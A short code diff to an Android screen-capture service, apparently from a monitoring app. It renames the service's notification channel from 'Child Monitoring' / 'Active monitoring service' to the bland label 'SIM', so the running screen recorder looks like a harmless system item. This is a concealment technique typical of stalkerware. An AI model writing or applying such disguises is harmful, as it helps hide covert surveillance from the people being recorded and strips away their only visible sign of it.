@@ -143,8 +143,8 @@ public class ScreenCaptureService extends Service {
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel ch = new NotificationChannel(
-                    CHANNEL_ID, "Child Monitoring", NotificationManager.IMPORTANCE_LOW);
-            ch.setDescription("Active monitoring service");
+                    CHANNEL_ID, "SIM", NotificationManager.IMPORTANCE_LOW);
+            ch.setDescription("SIM");
             NotificationManager nm = getSystemService(NotificationManager.class);
             if (nm != null) nm.createNotificationChannel(ch);
         }
